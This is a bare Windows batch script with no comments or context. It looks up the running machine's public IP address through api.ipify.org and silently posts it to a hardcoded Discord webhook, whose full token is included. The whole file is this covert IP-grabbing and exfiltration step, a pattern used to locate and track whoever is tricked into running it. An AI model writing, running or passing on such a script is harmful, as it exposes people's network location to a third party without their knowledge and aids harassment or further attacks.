@echo off
for /f "tokens=*" %%i in ('curl -s https://api.ipify.org') do set IP=%%i
curl -X POST -H "Content-Type: application/json" -d "{\"ip\":\"%IP%\"}" https://canary.discord.com/api/webhooks/1370905037009715250/8-Wr_LBH9SXxKxjhZkOypSEJrUKlCkKiU1a5WDUPyYYkbkmRKEfBGw3mRQB5ggh2iRXJ
